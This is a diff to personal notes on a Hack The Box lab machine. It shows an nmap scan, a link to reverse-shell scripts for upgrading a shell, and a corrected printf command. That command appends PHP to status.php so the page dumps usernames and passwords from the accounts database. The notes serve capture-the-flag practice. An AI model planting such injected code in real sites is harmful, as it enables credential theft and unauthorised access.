@@ -38,7 +38,7 @@ nmap -p- -A -oN Exploreprts.txt ${IP}
 + check https://github.com/crcirq32/Bash/blob/main/reverseshells.sh to upgrade shell
 + m4lwhere seems to house all permissions
   + Must access users from db to get more info on m4lwhere
-    + append to status.php
-    + printf("<?php\n$db = connectDB();\n$query = "SELECT username, password FROM accounts";\n$users = $db->query($query);\nif ($users->num_rows > 0) {\nwhile($row = mysqli_fetch_assoc($users)) {\nvar_dump($row);\n}\n}\n$db->close();") >> status.php
+    + printf '<?php\n$db = connectDB();\n$query = "SELECT username, password FROM accounts";\n$users = $db->query($query);\nif ($users->num_rows > 0) {\nwhile($row = mysqli_fetch_assoc($users)) {\nvar_dump($row);\n}\n}\n$db->close();' >> status.php
+    + ${IP}/status.php should now connect to DB and expose users
 
 TODO: 10.10.11.104 Hung up - Stuck in limbo. Contact HTB
